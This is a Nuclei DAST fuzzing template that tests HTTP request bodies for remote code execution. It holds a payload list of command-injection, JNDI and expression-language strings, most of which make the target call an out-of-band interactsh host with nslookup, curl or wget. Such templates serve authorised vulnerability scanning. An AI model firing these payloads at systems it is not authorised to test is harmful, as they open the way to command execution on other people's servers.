http:
- fuzzing:
  - fuzz:
    - '{{rce}}'
    mode: single
    part: body
    type: replace
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
    - http
  payloads:
    rce:
    - $(exec('nslookup {{marker}}'))
    - $(nslookup {{marker}})
    - $(ping -c 1 {{marker}} | nslookup {{marker}} ; wget {{marker}} -O /dev/null)
    - ${'{{marker}}'.resolve}
    - ${dns({{'interactsh-url'}})}
    - ${jndi:ldap://127.0.0.1#.${hostname}.{{marker}}}
    - ${resolve({{'interactsh-url'}})}
    - ${url:UTF-8:https://{{Hostname}}.q.{{marker}}}
    - '%0A&&nslookup {{marker}}'
    - '%0A;nslookup {{marker}}'
    - '%0A||nslookup {{marker}}'
    - '%0D%0A&&nslookup {{marker}}&&'
    - '%0D%0A;nslookup {{marker}}'
    - '%0D%0A||nslookup {{marker}}'
    - '%0D%0A||nslookup {{marker}}||'
    - '%0D&&nslookup {{marker}}'
    - '%0D;nslookup {{marker}}'
    - '%0D||nslookup {{marker}}'
    - '&$(nslookup {{marker}})'
    - '&&$(nslookup {{marker}})'
    - '&&`nslookup {{marker}}`'
    - '&&curl {{interactsh-url}}'
    - '&&curl {{interactsh-url}}&&'
    - '&&nslookup {{marker}}'
    - '&&wget {{interactsh-url}}'
    - '&&wget {{interactsh-url}}&&'
    - '&`nslookup {{marker}}`'
    - '&nslookup {{marker}}'
    - '&nslookup {{marker}}&''\"`0&nslookup {{marker}}&`'''
    - '/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-''/*$(nslookup
      {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||''"||nslookup({{marker}})||"/*`*/'
    - 1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}";nslookup${IFS}{{marker}};#${IFS}
    - ;$(nslookup {{marker}})
    - ;`nslookup {{marker}}`
    - ;curl {{interactsh-url}};
    - ;nslookup {{marker}}
    - ;nslookup {{marker}};
    - ;wget {{interactsh-url}};
    - '`curl {{interactsh-url}}`'
    - '`nslookup {{marker}}`'
    - '`wget {{interactsh-url}}`'
    - echo {{base64(url_encode('nslookup {{marker}}'))}}|base64 -d|sh}
    - gethostbyname('{{marker}}');
    - '||$(nslookup {{marker}})'
    - '||$(nslookup {{marker}});'
    - '||$(nslookup {{marker}})||'
    - '||`nslookup {{marker}}`'
    - '||`nslookup {{marker}}`||'
    - '||curl {{interactsh-url}}'
    - '||curl {{interactsh-url}}||'
    - '||nslookup {{marker}}||'
    - '||wget {{interactsh-url}}'
    - '||wget {{interactsh-url}}||'
  pre-condition:
  - dsl:
    - method == "POST"
    - method == "PUT"
    - method == "DELETE"
    - method == "PATCH"
    type: dsl
  stop-at-first-match: true
id: rce-body-collaborator
info:
  author: reewardius
  name: Remote Code Execution
  severity: critical
  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-body,fuzzing-req-body-query,fuzzing-req-rce-body-query,rce,dast
variables:
  marker: '{{interactsh-url}}'
